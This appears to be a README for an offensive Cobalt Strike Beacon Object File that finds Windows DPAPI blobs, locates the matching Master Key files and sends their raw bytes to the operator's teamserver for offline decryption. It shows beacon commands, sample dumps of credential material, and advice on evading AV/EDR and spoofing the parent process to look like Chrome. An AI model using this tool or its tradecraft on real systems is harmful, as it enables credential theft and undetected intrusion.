# DPAPI-BOF
A Beacon Object File (BOF) for Cobalt Strike designed to identify DPAPI blobs, calculate the corresponding Master Key paths, and  exfiltrate data.

## Disclaimer
[!WARNING] 
This tool is still under development and may crash your beacon. If your beacon dies, you were warned.

[!NOTE] 
This tool is intended for authorized security auditing and post-exploitation research only.

## Features
- **Scanning**: Identifies files containing DPAPI magic bytes.
- **Master Key Mapping**: Automatically generates the expected path for the required Master Key based on the user's SID.
- **Data Exfiltration**: Extract the raw bytes from the DPAPI credential material for offline processing/decoding/cracking.

## Stealth Considerations
- **No 'Fork & Run'**: Executes within the Beacon process, avoiding suspicious child process creation.
- **Zero Disk IO**: Operates entirely in memory.
- **AV/EDR Bypass**: Minimalist design reduces the likelihood of signature-based detection and memory-scanning alerts.
- **Small Payload**: Optimized size (typically < 6.1KB) minimizes the RWE memory allocation signature.

## Installation
1. Copy `dpapi-bof.c` and `beacon.h` to your Linux/Windows build machine.
2. Compile the object file (see Compilation section).
3. Load `dpapi-bof.cna` into Cobalt Strike via the **Script Manager**.

## Compilation
```cmd
attacker@LAB-DEVBOX /cygdrive/c/Users/Administrator/Desktop/bofs
$ x86_64-w64-mingw32-gcc -c dpapi-bof.c -o dpapi-bof.o

attacker@LAB-DEVBOX /cygdrive/c/Users/Administrator/Desktop/bofs
$ 
```

## Usage
First of all, I would not recommend running this from your most cherished beacon.
I did test it, but that doesn't mean that it could crash in another environment.  
I would highly advise that you establish persistence or an alternative beacon in case the BOF crashes.

Secondly, if you want to maintain OPSEC you should run this intentionally.
That means it should not be a shotgun approach where you search for blobs starting from 'C:\'.
Doing so would be noisy and would consume CPU cycles to generate unnecessary traffic.
Target a user or application data directory for optimal usage.

Finally, since this is a BOF and not an executable, assembly, etc., we don't need to worry about 'Fork and Run'.
It is still advisable to either spoof the parent process ID or migrate to another process that won't look as suscipous when it attempts to locate DPAPI data.
If we can use the PPID of a Chrome Browser, for example, it would be normal usage for the application to parse DPAPI material.

### Command Line
Scan of DPAPI blobs and output filename and Master Key GUID.
```
[02/06 02:37:09] beacon> 
[02/06 02:37:10] beacon> dpapi_scan c:\dev\training\dpapi\tmp\*
[02/06 02:37:10] [+] DEBUG: raw flag value is: 0
[02/06 02:37:10] [*] Running DPAPI Scanner (Dump Raw: ) against: c:\dev\training\dpapi\tmp\*
[02/06 02:37:11] [+] host called home, sent: 5869 bytes
[02/06 02:37:11] [+] received output:
[+] Found DPAPI blob: c:\dev\training\dpapi\tmp\encrypted.out
[*] Master Key GUID: 90CB3C57-FCA2-46D8-B936-07ADD124DF79
[+] BOF Finished.
```

Scan of DPAPI blobs and output raw bytes for any files found.
```
[02/06 01:20:00] beacon> dpapi_scan c:\dev\training\dpapi\tmp\* true
[02/06 01:20:00] [*] Running DPAPI Scanner (Dump Raw: true) against: c:\dev\training\dpapi\tmp\*
[02/06 01:20:09] [+] host called home, sent: 5629 bytes
[02/06 01:20:09] [+] received output:
[+] Found DPAPI blob: c:\dev\training\dpapi\tmp\encrypted.out
[*] Raw bytes for c:\dev\training\dpapi\tmp\encrypted.out (246 bytes):
\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00\x57\x3C\xCB\x90\xA2\xFC\xD8\x46
\xB9\x36\x07\xAD\xD1\x24\xDF\x79\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x10\x66\x00\x00\x00\x01\x00\x00\x20\x00\x00\x00\xC7\x9C
\x77\x3D\x15\xC6\xDF\x5D\x58\x51\xE8\x53\x73\x93\x8A\x1C\xEE\x10\x01\x55\xE4\xBA\x1F\x35\x7C\x0E\xF0\x06\x9D\xE0\xB4\x8D\x00\x00
\x00\x00\x0E\x80\x00\x00\x00\x02\x00\x00\x20\x00\x00\x00\x33\x4A\xFB\x99\x2D\x0C\x6F\x23\xCE\xC1\x66\xAC\x27\x95\x78\xBE\x04\x97
\x29\x59\xE3\x1D\x36\x76\xF5\x47\xC3\xEE\xBE\x3C\xCA\x3C\x20\x00\x00\x00\x32\x20\x90\x91\x5E\xC4\x47\x54\xD7\xFA\x74\x20\xC1\x2C
\x0A\x53\x66\x93\x5A\x90\x70\xA7\xEA\x27\xDE\x71\xB1\x7B\x74\x13\xC0\x96\x40\x00\x00\x00\x96\xD9\x12\x2D\xEE\x37\x58\x17\xCA\x6A
\xE7\xFB\x25\xB2\x94\x41\x4B\xB7\x3A\xA7\x27\x57\x29\xA0\x7D\x25\xC5\x8E\xA6\x97\x53\x5A\xCA\xCC\xB3\xB7\x7B\xE4\xEF\xCA\xA3\x22
\x01\x20\x5B\xC1\xE2\x12\x14\x09\xEA\x28\xF0\xE7\x4F\xDB\x63\xF2\x11\x7A\x62\x1C\x01\xC3
[+] End of Dump
[*] Master Key GUID: 90CB3C57-FCA2-46D8-B936-07ADD124DF79
[*] Attempting to dump Master Key: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1819015816-4043004443-4211160424-500\90CB3C57-FCA2-46D8-B936-07ADD124DF79
[*] Raw bytes for C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1819015816-4043004443-4211160424-500\90CB3C57-FCA2-46D8-B936-07ADD124DF79 (468 bytes):
\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x39\x00\x30\x00\x63\x00\x62\x00\x33\x00\x63\x00\x35\x00\x37\x00\x2D\x00\x66\x00
\x63\x00\x61\x00\x32\x00\x2D\x00\x34\x00\x36\x00\x64\x00\x38\x00\x2D\x00\x62\x00\x39\x00\x33\x00\x36\x00\x2D\x00\x30\x00\x37\x00
\x61\x00\x64\x00\x64\x00\x31\x00\x32\x00\x34\x00\x64\x00\x66\x00\x37\x00\x39\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00
\xB0\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x02\x00\x00\x00\xC0\x37\x81\xC9\x28\x69\xF6\x93\xDF\xAD\xB0\xA4\xEA\x6A\x9C\x89\x40\x1F\x00\x00\x0E\x80\x00\x00\x10\x66\x00\x00
\xD8\x52\x30\xFA\xEB\xA3\xD8\x33\xA0\x7D\x48\x6D\xFA\xC8\xB9\xEB\x73\x63\x96\x24\xB4\x13\x13\x09\x5A\x2D\x04\xE4\xB6\xAD\xB2\x96
\x13\x7E\x69\x64\x5B\xF1\x4A\x97\x76\xC6\x54\xA0\x7C\x09\xE9\xCF\x6F\xF4\x30\xE5\xA7\xD7\x5F\x4A\x1C\xC7\x10\x25\x55\x6C\xF8\x82
\x37\x4C\xB1\x72\xEB\x3B\xCC\x25\x94\xF5\x33\xAD\x5A\x9A\xDF\x01\xB2\xB4\x42\x78\xF2\xCE\xD5\x79\x3E\x3A\x54\x89\x32\x2D\xF9\x0C
\x27\x97\x4E\x3C\x82\x97\x26\x4E\x72\xEA\xE0\xFC\xD4\xD3\x0D\x7C\x17\xF7\x8A\x91\x9F\xB9\x9A\xB5\x06\xB9\xC3\x65\x5B\x20\x54\xDF
\x36\xE9\xBA\x37\xD0\x27\xE9\x1D\x5F\x64\x47\x88\x7C\x81\x0D\x8B\x02\x00\x00\x00\x00\x94\x1E\xC6\x2F\x90\x05\x61\x85\xB9\xC3\x6D
\x31\x1D\x15\xF7\x40\x1F\x00\x00\x0E\x80\x00\x00\x10\x66\x00\x00\x80\x3D\x66\x0C\x63\xCE\xE5\x0B\x0B\xFE\x3E\x32\xAE\x80\x64\xF3
\x39\x62\x15\x5A\xAC\x54\x1C\xF6\x64\x66\x4F\x0B\x3F\xE1\xB3\x3E\x55\x9C\xC0\x2D\x09\xEB\x85\x31\x2F\xB8\x9F\x3C\x3F\xAA\xB4\x75
\xCD\x3F\x6B\x4D\x1F\x3D\x49\x83\xA7\xCD\x85\xF9\x03\xC2\x10\xF8\x40\x6B\xB0\x98\x5E\x0F\xD8\x7D\x20\xD4\x9D\x1F\xD1\x82\xAD\xE7
\x3B\x52\xB0\x80\xF3\x86\x5F\x79\x9C\x6A\x88\xC1\x05\x94\x60\x86\xA5\x08\x1B\x26\xCB\x94\x7B\x2E\xFB\xB2\x01\x02\x59\xDC\x1F\xF7
\x03\x00\x00\x00\x1D\x47\xEC\xCE\xFD\x0A\x64\x4A\x88\xC2\x24\xB5\x84\xB2\x3A\xBC
[+] End of Dump
[+] BOF Finished.
```

## Technical Details
The BOF uses Dynamic Function Resolution (DFR) to interact with Windows APIs, ensuring it remains small and memory-resident without touching the disk (besides the files it reads). It uses the BeaconDownloadFile API to securely sync files back to the Teamserver.

### Summary of the Flow
1. **The BOF** finds a blob, parses the header, and dumps the raw bytes.
2. **The BOF** identifies the **Master Key GUID**, locates it and dumps the raw bytes.
4. **The Operator** uses a tool like Mimikatz or a Python script offline to decrypt secret.

## Known Limitations
1. There is a hard limit on the output buffer. I really need to change this approach.
2. This only searches for blobs stored in a binary format and won't find data encoded with other methods, like XML or Base64.
3. We don't want to load every file to check for DPAPI content, so the code checks the first 1024 bytes.

## Future Improvements
- [ ] **Recursive Scanning**: Expanding the functionality to scan sub-directories.
- [ ] **File Browser Integration:** Add the ability to scan a directory from the context menu in the File Browser.
- [ ] **Text-Based Hunting:** Add the ability to find the magic bytes in plaintext.
- [ ] **Artifact Download:** Add the ability to automatically download any blobs and Master Key files to the CS Teamserver.
- [ ] **Enhanced Output:** Rework the output to use a dynamic buffer instead of a fixed global variable.
- [ ] **Registry Hunting:** Ability to hunt and extract DPAPI data from the registry.